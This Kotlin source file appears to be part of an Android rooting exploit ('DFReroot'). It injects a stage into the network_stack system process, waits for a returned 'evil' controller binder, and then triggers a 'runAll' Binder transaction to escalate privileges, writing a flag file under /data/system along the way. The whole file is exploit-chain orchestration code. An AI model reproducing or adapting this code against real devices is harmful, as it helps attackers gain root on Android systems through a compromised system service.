package com.polygraphene.df.reroot

import android.content.Context
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.os.SystemClock
import android.util.Log
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference

object AutoRoot {
    const val FLAG_PATH = "/data/system/dfreroot-running"
    const val TAG = "DFReroot"
    val rootRunning = AtomicBoolean(false)
    private val evilController = AtomicReference<IBinder?>(null)
    private val evilLock = Object()

    fun onEvilReceived(controller: IBinder?) {
        evilController.set(controller)
        synchronized(evilLock) { evilLock.notifyAll() }
    }

    fun isFlagSet(): Boolean {
        return try {
            File(FLAG_PATH).exists()
        } catch (t: Throwable) {
            false
        }
    }

    fun setFlag(): Boolean {
        return try {
            File(FLAG_PATH).writeText("")
            true
        } catch (t: Throwable) {
            false
        }
    }

    fun clearFlag() {
        try {
            File(FLAG_PATH).delete()
        } catch (t: Throwable) {
            Log.w(TAG, "flag delete failed: $t")
        }
    }

    fun syncNow() {
        try {
            Runtime.getRuntime().exec("sync").waitFor()
        } catch (t: Throwable) {
            Log.w(TAG, "sync failed: $t")
        }
    }

    fun readBootId(): String? {
        return try {
            File("/proc/sys/kernel/random/boot_id").readText().trim().ifEmpty { null }
        } catch (t: Throwable) {
            null
        }
    }

    fun runRoot(context: Context, onReport: (String) -> Unit, controllerTimeoutMs: Long = 60_000): Int {
        evilController.set(null)
        onReport(StageHop.hopToNetworkStack(context))
        val deadline = SystemClock.uptimeMillis() + controllerTimeoutMs
        synchronized(evilLock) {
            while (evilController.get() == null) {
                val left = deadline - SystemClock.uptimeMillis()
                if (left <= 0) break
                onReport("[*] waiting for CONTROLLER... (${left / 1000}s left)\n")
                try {
                    evilLock.wait(minOf(left, 5_000))
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    break
                }
            }
        }
        val c = evilController.get() ?: run {
            onReport("[x] no CONTROLLER within ${controllerTimeoutMs / 1000}s " +
                "(hop failed or network_stack too slow; see logcat)\n")
            return -1
        }
        onReport("networkstack CONTROLLER binder received\n")
        return transactRunAll(c, onReport)
    }

    private fun transactRunAll(controller: IBinder, onReport: (String) -> Unit): Int {
        val p = Parcel.obtain()
        val r = Parcel.obtain()
        val reporter = object : Binder() {
            override fun onTransact(
                code: Int, data: Parcel, reply: Parcel?, flags: Int
            ): Boolean {
                try {
                    onReport(data.readString() ?: "")
                } catch (t: Throwable) {
                    Log.e(TAG, "reporter recv failed", t)
                }
                return true
            }
        }
        p.writeStrongBinder(reporter)
        try {
            if (controller.transact(5, p, r, 0)) {
                val res = r.readInt()
                onReport("\nrunAll done res=$res\n")
                return res
            }
            onReport("runAll failed: transact returned false\n")
            return -1
        } catch (t: Throwable) {
            onReport("runAll failed: ${t.message}\n")
            return -1
        } finally {
            p.recycle()
            r.recycle()
        }
    }
}
